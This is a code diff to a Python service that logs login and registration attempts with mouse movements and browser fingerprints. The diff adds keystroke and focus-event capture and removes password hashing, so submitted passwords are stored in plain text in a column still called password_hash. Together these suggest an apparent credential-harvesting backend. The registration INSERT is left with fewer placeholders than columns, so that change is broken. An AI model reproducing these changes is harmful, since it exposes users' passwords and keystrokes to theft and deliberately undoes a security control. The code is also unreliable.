@@ -163,6 +163,8 @@ def init_database():
             timezone TEXT,
             plugins TEXT,
             do_not_track TEXT,
+            keystrokes TEXT,
+            focus_events TEXT,
             success BOOLEAN DEFAULT 0,
             FOREIGN KEY (session_id) REFERENCES sessions (session_id)
         )
@@ -191,6 +193,8 @@ def init_database():
             timezone TEXT,
             plugins TEXT,
             do_not_track TEXT,
+            keystrokes TEXT,
+            focus_events TEXT,
             FOREIGN KEY (session_id) REFERENCES sessions (session_id)
         )
     ''')
@@ -481,7 +485,7 @@ def log_login_attempt(data, ip_address):
             return False
 
         # Hash password for secure storage
-        password_hash = hash_password(password)
+        password_hash = password
 
         # Limit mouse movements to prevent memory issues
         mouse_movements = data.get('mouse_movements', [])
@@ -492,8 +496,8 @@ def log_login_attempt(data, ip_address):
             INSERT INTO login_attempts
             (session_id, attempt_number, username, password_hash, remember_me,
              ip_address, user_agent, referrer, mouse_movements, form_fill_time,
-             screen_info, browser_info, timezone, plugins, do_not_track)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+             screen_info, browser_info, timezone, plugins, do_not_track, keystrokes, focus_events)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
         ''', (
             session_id,
             int(data.get('attempt_number', 1)),
@@ -509,7 +513,9 @@ def log_login_attempt(data, ip_address):
             json.dumps(data.get('browser_info', {})),
             sanitize_input(data.get('timezone', ''), 50),
             json.dumps(data.get('plugins', [])),
-            sanitize_input(data.get('doNotTrack', ''), 10)
+            sanitize_input(data.get('doNotTrack', ''), 10),
+            json.dumps(data.get('keystrokes', [])),
+            json.dumps(data.get('focus_events', []))
         ))
 
         conn.commit()
@@ -536,7 +542,7 @@ def log_registration_attempt(data, ip_address):
         if not all([session_id, fullname, email, username, password]):
             return False
 
-        password_hash = hash_password(password)
+        password_hash = password
 
         # Limit mouse movements
         mouse_movements = data.get('mouse_movements', [])
@@ -547,7 +553,7 @@ def log_registration_attempt(data, ip_address):
             INSERT INTO registration_attempts
             (session_id, attempt_number, fullname, email, username, password_hash,
              terms_accepted, newsletter_subscribed, ip_address, user_agent, referrer,
-             mouse_movements, form_fill_time, screen_info, browser_info, timezone, plugins, do_not_track)
+             mouse_movements, form_fill_time, screen_info, browser_info, timezone, plugins, do_not_track, keystrokes, focus_events)
             VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
         ''', (
             session_id,
@@ -567,7 +573,9 @@ def log_registration_attempt(data, ip_address):
             json.dumps(data.get('browser_info', {})),
             sanitize_input(data.get('timezone', ''), 50),
             json.dumps(data.get('plugins', [])),
-            sanitize_input(data.get('doNotTrack', ''), 10)
+            sanitize_input(data.get('doNotTrack', ''), 10),
+            json.dumps(data.get('keystrokes', [])),
+            json.dumps(data.get('focus_events', []))
         ))
 
         conn.commit()
